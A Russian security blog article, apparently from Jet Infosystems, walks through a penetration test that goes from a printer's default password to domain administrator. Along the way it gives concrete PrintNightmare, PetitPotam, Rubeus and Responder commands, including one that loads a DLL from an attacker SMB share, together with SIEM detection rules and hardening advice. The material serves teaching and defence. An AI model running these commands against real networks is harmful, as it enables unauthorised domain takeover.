{
    "article_id": "725008",
    "article_name": "В начале был принтер. Как получить привилегии администратора домена, начав с принтера",
    "content": "Еще в прошлом году мы c командой решили поделиться несколькими интересными векторами получения привилегий администратора домена. По отзывам, первая \nстатья\n оказалась полезной и интересной. Настало время продолжить. В этом посте я расскажу о том, как получение доступа к панели администрирования принтера может привести к компрометации всего домена Active Directory с помощью эксплуатации уязвимости PrintNightmare и использования неограниченного делегирования. А коллеги из Jet CSIRT дополнили пост рекомендациями по мониторингу на каждом этапе на случай, если вы хотите мониторить такие атаки в вашем SIEM. Краткое описание — на схеме. \nПодробнее — под катом. \nВнимание! Данная статья носит исключительно информационный характер и предназначена для образовательных целей. Ни в коем случае не пробуйте атаки на чужие сети — это неправильно как с точки зрения этики, так и закона. Подобные действия разрешено выполнять либо в своей инфраструктуре, либо с разрешения владельца корпоративной сети (лучше — письменного).\nНачало. Получаем доменную учетную запись из принтера\nПосле того, как я подключилась в сеть в рамках работ по внутреннему тестированию на проникновение, первым делом посмотрела, какие протоколы используются, но ничего полезного для себя не нашла. Далее я всегда сканирую сети на открытые TCP-порты (445, 22, 80, 443, 8080, 8443 и др.). Попытки найти общие папки, доступные неаутентифицированным пользователям, или выгрузить список пользователей домена не были успешными. Найти уязвимости в Windows-машинах, которые можно проэксплуатировать без учетной записи, тоже не удалось. \nКак мониторить этап сканирования\nКак только злоумышленники попадают в сеть атакуемой организации, первая их задача — осмотреться. Этап разведки может быть очень «шумным». В самом начале, например, был использован инструмент Мasscan, который сканировал популярные TCP-порты прикладного уровня, на которых обычно работают веб-приложения (80,443,8080,8443,8000). При условии, что злоумышленник сканирует все сетевые сегменты, до которых может дотянуться, средства защиты обязательно заметят такой recon. Поэтому позаботьтесь о том, чтобы на вашем SIEM было настроено правило, выявляющее массовые обращения на популярные порты (например, больше пяти) от одного узла во внутренней сети. Вот вам псевдокод:\nsrc.ip IN [Internal_Network]  AND  dst.ip IN [Internal_Network] AND ip.protocol IN (6,17)  AND  dst.port IN (App_Level_Ports)\nCOUNT(DISTINCT dst.port) >= 10\nПомните: чем раньше будет этап киллчейна, на котором вы обнаружите у себя в сети «плохих парней», тем эффективнее вы сможете остановить атаку и уменьшить потенциальный импакт.\nИ тут настало время веб-приложений. С помощью утилиты Masscan я уже нашла хосты, где открыты TCP-порты, которые чаще всего используются веб-приложениями (80, 443, 8080, 8443, 8000). Во внутренней сети могут быть сотни и даже тысячи веб-приложений. Посмотреть их все вручную нереально. Для работы я использую eyewitness (можно использовать gowitness). Он проходится по всем веб-приложениям, пытается сделать скриншот, сортирует по категориям (например, принтеры, сетевые устройства, Unauthorized, инфраструктура) и сохраняет отчет в html. Как использую его я (да, скорее всего, можно сделать это лучше, но мне удобно так):\nmasscan -p 80,443,8080,8443,8000 -i eth0 | tee web_ports.txt\ncat web_ports.txt | awk {‘print $6’} | sort | uniq > web_hosts.txt\nnmap -p 80,443,8080,8443,8000 -iL web_hosts.txt -oX nmap_scan_web.xml\neyewitness -x nmap_scan_web.xml -d eyew --web\n \nПример отчета eyewitness\nВ отчете eyewitness я нашла принтеры Kyocera. В них, по моему опыту, в 90% случаев установлен пароль по умолчанию Admin:Admin. И в этот раз с этими учетными данными я попала в панель управления принтера. \n«Это всего лишь принтер, что с него взять?» — скажете вы. Но нет. \nПример доступа к административной панели принтера\nВ настройках этого принтера были указаны настройки внешней адресной книги, которая используется для загрузки информации о пользователях Active Directory, например, для отправки результата сканирования пользователю. То есть у принтера есть учетная запись, с которой он обращается к LDAP-серверу. Это уже можно использовать: запустив на своем хосте Responder (который поднимает в том числе и LDAP-сервер), я заменила имя LDAP-сервера на IP-адрес моей Kali Linux и нажала кнопку «Тест». В результате получила пароль УЗ DOMAIN\\Reader в открытом виде. \nПароль УЗ DOMAIN\\Reader в открытом виде\n   \nРазвитие атаки. Получение привилегий администратора на хосте\nПервым делом я запустила коллектор Bloodhound с полученной учетной записью (про него писала в прошлой \nстатье\n).\nНо путей повышения привилегий через некорректные ACL не нашла. Атаки Kerberoasting и Asreproasting тоже не удались (подробнее про них можно почитать \nздесь\n). Даже мой любимый Password Spray мне не помог (это было даже обидно). \nКак обнаруживать запуск коллекторов Bloodhound\nBloodhound при определенных условиях тоже может громко заявить о себе в инфраструктуре. Дело в том, что стандартные модули BH обычно обращаются к DC по LDAP без каких-либо ограничений. Например, запрашивают всех пользователей домена или все группы и компьютеры. Такие LDAP-запросы можно отслеживать, но есть несколько нюансов.\nВо-первых, нужно выполнить специальные настройки аудита, а во-вторых, события, которые генерируются после этого, могут быть чрезвычайно массовыми, в зависимости от величины домена.\nИтак, включаем настройки изменением следующих ключей реестра на DC:\nДобавить параметр \n(DWORD) \n15 Field Engineering = 5\n \nпо следующему пути:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Diagnostic\\\nДобавить параметр \n(DWORD) \nExpensive Search Results Threshold = 1\n \nпо следующему пути:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\\nДобавить параметр \n(DWORD) \nInefficient Search Results Threshold = 1\n \nпо следующему пути:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\\n Этими настройками мы включим логирование всех LDAP-запросов к DC, поэтому, если домен большой, то это может нагрузить DC и SIEM. Рекомендуется предварительно оценить параметры домена и подстроить параметры \nExpensive Search Results Threshold \nи\n \nInefficient Search Results Threshold \nсоответственно.\nЗато после этой настройки мы начнем получать события 1644, в которых можем отслеживать подозрительные обращения. К таким могут относиться, например, \n(objectClass=*)  (objectClass=user) — \nвыгрузка всех пользователей, или \n(objectClass=*)  (objectClass=computer) —\n выгрузка информации обо всех компьютерах домена.\nЗато на нескольких хостах я нашла уязвимость PrintNightmare, которая позволяет выполнить произвольный код от имени NT AUTHORITY\\Система. С помощью общедоступного \nэксплойта\n, полученной ранее учетки DOMAIN\\Reader и dll, при выполнении которой изменяется пароль локального пользователя Administrator, проэксплуатировала уязвимость на хосте ca02.domain.local:\npython CVE-2021-1675.py domain.local\\username:password@victim-ip ‘\\\\attacker_host\\smb_share_name\\dll_name.dll’\nЭксплуатация уязвимости PrintNightMare\nС помощью crackmapexec проверяю, сменился ли пароль. И ура! Вижу заветное \nPwn3d!\n, которое означает, что у меня есть привилегии администратора на хосте. \nПроверка изменения пароля\nКак ловить PrintNightmare\nАтака PrintNightmare связана с двумя уязвимостями — CVE-2021-1675 и CVE-2021-34527, и обе они связаны со службой Print Spooler (\nspoolsv.exe\n) в операционных системах Windows.\nПервой была обнаружена LPE-уязвимость CVE-2021-1675, которая позволяла пользователю без прав администратора добавлять в систему новый драйвер принтера (DLL), который запускался процессом \nspoolsv.exe\n с правами SYSTEM. Таким образом злоумышленник мог локально повысить себе привилегии на атакуемой системе. Эта уязвимость была устранена путем разрешения добавлять новые драйверы принтеров только администраторам.\nОднако вскоре исследователи обнаружили, что уязвимость может быть проэксплуатирована удаленно через другой вектор. Данному RCE-способу был присвоен новый идентификатор — CVE-2021-34527, — и обычно, когда используют PrintNightmare, речь идет именно о нем. Его суть заключается в эксплуатации уязвимости функций протокола MS-RPRN (Print System Remote Protocol), а именно — \nRpcAddPrinterDriverEx()\n. Она позволяет указать в своих параметрах UNC-путь к библиотеке на другом ресурсе, который может контролировать злоумышленник. UNC-путь — это путь к файлу или директории в сети, который имеет синтаксис \n`\\\\<computer name>\\<shared directory>\\\n`.\nТаким образом, злоумышленник может создать вредоносную DLL-библиотеку и разместить ее на своем ресурсе (например, SMB-шаре), а затем через удаленный вызов процедур (RPC) заставить атакуемый хост скачать данную DLL и запустить с правами SYSTEM от имени процесса spoolsv.exe.\nПри правильной настройке аудита PrintNightmare может быть весьма «шумным». Как можно понять из принципа его действия, ключевым моментом успешной атаки является загрузка вредоносного драйвера на атакуемый хост. Кроме того, в процессе эксплуатации осуществляется обращение к файлам внутри директории \n\\Windows\\System32\\spool\\drivers\\x64\\3\\*\n, а еще — к ключам реестра \nMACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print.\nВ Jet CSIRT мы детектируем данную атаку двумя способами — более простым, но менее сложным, и более точным.\nПервый способ заключается в отслеживании специфичных событий Windows 5145 (A network share object was checked to see whether client can be granted desired access), в которых обращение происходит к шаре \n$IPC\n и именованному каналу \nspools \nс маской доступа \n0x3 — ReadData (or ListDirectory), WriteData (or AddFile). \nДля генерации событий 5145 в политике расширенного аудита нужно включить опции: \nObject Access - Audit Detailed File Share: Success/Failure\n              А псевдокод правила может выглядеть так:\nevent.id = “5145” AND \nshare.name = \\\\*\\IPC$ AND\nmask = “0x3” AND\n              target = “spoolss”\nДля более надежного метода выявления нужно дополнить данное правило событиями доступа к упомянутым файлам и изменения ключей реестра. Для этого необходимы события 4663 (An attempt was made to access an object) и 4656 (A handle to an object was requested). Для их генерации в политике расширенного аудита нужно включить опции: \n- Object Access - File System: Success/Failure\n- Object Access - Registry: Success\nТакже необходимо будет настроить SACL, который будет мониторить обращения к файлам внутри директории \n\\Windows\\System32\\spool\\drivers\\x64\\3\\*\n и ключам реестра \nMACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print.\nДолжны получиться такие SACL:\n  - \"%SystemRoot%\\System32\\spool\",0,\"S:AR(AU;OISA;DCLCDTCRSDWDWO;;;WD)\"\n  - \"MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\",0,\"D:PAR(A;CI;KA;;;BA)(A;CIIO;KA;;;CO)(A;CI;KA;;;SY)(A;CI;KR;;;BU)(A;CI;KR;;;S-1-15-2-1)S:AR(AU;OICISA;DCLCWPSDWD;;;WD)\"\nПосле этого правило можно дополнить следующими условиями:\nevent.id = “5145” AND \nshare.name = \\\\*\\IPC$ AND\nmask = “0x3” AND\n              target = “spoolss”\nevent.id = “4663” AND \nprocess.name = spoolsv.exe AND\ntype = “registry key” AND\n              target REXEX “.*\\SYSTEM\\CurrentControlSet\\Control\\Print.*”\nevent.id = “4656” AND \nprocess.name = spoolsv.exe AND\n              target REXEX “.*windows\\system32\\spool\\drivers.*”\nЗашла по RDP и увидела, что на хосте запущен Kaspersky Endpoint Security. Иии… я просто остановила службы, потому что самозащита не была включена (ИБ-шник, который сидел рядом, очень удивился). \nОстановка службы Kaspersky Security\nОстановленные службы\nФинал. Получение привилегий администратора домена\nИз памяти lsass.exe файлов ничего интересного получить не удалось. Но, проанализировав данные в Bloodhound, я увидела, что для этого хоста настроено неограниченное делегирование. Нашла я это с помощью кастомного запроса из \nрепозитория\n:\n{\n       \"name\": \"Find computers that allow unconstrained delegation that aren’t domain controllers.\",\n            \"queryList\": [{\n                \"final\": true,\n                \"query\": \"MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2\"\n            }]\n        },\n \nЧто такое неограниченное делегирование\nНеограниченное делегирование — это привилегия, которая может быть назначена учетной записи компьютера или пользователя. Данная привилегия позволяет этой учетной записи проходить аутентификацию в сервисах от имени других учетных записей. \nЕсли у вас есть привилегии локального администратора на хосте с неограниченным делегированием, вы можете получить TGT-билеты пользователей, которые проходят аутентификацию на этом хосте, и переиспользовать их до истечения срока действия. \nХосты с неограниченным делегированием\n   \nНа ca02.domain.local я запустила Rubeus.exe в режиме монитора:\nRubeus.exe /monitorinterval:1 /targetuser:DC-name$ /nowrap\nС помощью эксплойта PetitPotam.py и учетки DOMAIN\\Reader я заставила контроллер домена DC03 пройти аутентификацию на хосте ca02.domain.local. В результате получила TGT-билет контроллера домена DC03 (подробнее про этот и другие четыре способа эксплуатации уязвимости PetitPotam можно почитать в другом моем \nпосте\n):\npython3 PetitPotam.py -u username -p password -d domain.local listener dc-name\nЭксплуатация PetitPotam\nПолучение TGT-билета контроллера домена DC0\nПолученный TGT-билет сохранила в файл. И затем с помощью mimikatz.exe были проведены атаки Pass-the-Ticket и DCSync для получения NTLM-хеша пароля администратора домена admin.\nСохранение TGT-билета в файл\nПолучение NTLM-хэша пароля пользователя admin\nРекомендации по мониторингу эксплуатации уязвимости PetitPotam описаны в \nпосте\n.\nКак ловить атаку DCSync\nАтака DCSync заключается в легитимной возможности репликации базы данных Active Directory (\nntds.dit\n) между контроллерами домена. Злоумышленник может заставить удаленный контроллер домена выполнить синхронизацию ndts.dit с подконтрольным ему хостом. Для проведения атаки DCSync злоумышленник должен предварительно скомпрометировать учетную запись с правами на репликацию изменений каталога домена (\nReplicating Directory Changes All\n и \nReplicating Directory Changes\n, имеющих соответствующие GUID). Необходимыми правами обладают члены групп «Администраторы», «Администраторы домена», «Администраторы предприятия» и «Контроллеры домена».\nПосле того как злоумышленник скомпрометировал подходящую учетную запись, он может использовать удаленный протокол службы репликации каталогов (DRS — Directory Replication Service) для репликации данных из Active Directory.\nЭта атака опасна тем, что злоумышленник получает хэши паролей всех учетных записей домена, в том числе — УЗ \nkrbtgt\n (учетная запись в AD, которая подписывает все Kerberos-тикеты), хэш которой может быть использован для создания Golden Ticket.\nНеобходимые настройки аудита\nDS Access - Audit Directory Service Access: Success/Failure\nПсевдокод для правила:\nevent.id = “4662” AND \nuser.name NOT REGEX “.*$” AND\nmask = “0x100” AND\n              properties = “\n \n1131f6aa-9c07-11d1-f79f-00c04fc2dcd2” OR “89e95b76-444d-4c62-991a-0facbeda640c” OR “9923a32a-3607-11d2-b9be-0000f87a36b2”\n \nПосле этого я провела атаку Pass-the-Hash (это когда мы проходим аутентификацию с помощью NTLM-хеша пароля, а не пароля), создала учетку пользователя JetPentest и добавила ее в группы Administrators и Domain Admins. И по традиции подключилась по RDP к контроллеру домена. \nКак мониторить создание УЗ администратора домена\nА это совсем простенький кейс. Нужно всего лишь отслеживать добавление учетной записи в привилегированную группу администраторов домена. Согласитесь, такое случается нечасто.\nОтслеживаем события 4728, где целевая группа, в которую добавляют пользователя, имеет права администратора домена. Да и добавление в другие привилегированные группы отслеживать будет довольно полезно.\nВыводы\nВроде бы такая «мелочь», как пароль «по умолчанию» в админке принтера, в итоге привела к компрометации домена. Свою роль, конечно, сыграли и наличие уязвимости, для которой патч вышел за несколько месяцев до этого, и большое количество хостов с неограниченным делегированием. Это говорит о том, что стороне защиты всегда нужно быть начеку и устранять даже самые мелкие недочеты. \nДля устранения недостатков, которые привели к получению привилегий администратора домена, необходимо:\nИзменить все учетные данные «по умолчанию». Даже в принтерах. И выстроить процессы таким образом, чтобы впредь в сети не появлялись устройства с такими учетками. \nПроверить, действительно ли нужно неограниченное делегирование хостам, для которых оно настроено. Если нет — отключить. \nВключить самозащиту антивирусного ПО.\nПроверить установку обновлений ОС Windows. Выяснить, почему обновление не было установлено, и скорректировать процесс управления уязвимостями. \nАвторы поста: \nИрина Беляева, \nстарший консультант по информационной безопасности компании «Инфосистемы Джет»\nАлександр Ахремчик, \nведущий аналитик Департамента аутсорсинга Центр информационной безопасности компании «Инфосистемы Джет»\n \n ",
    "tags": [
        "хакер",
        "взлом принтеров",
        "killchain"
    ]
}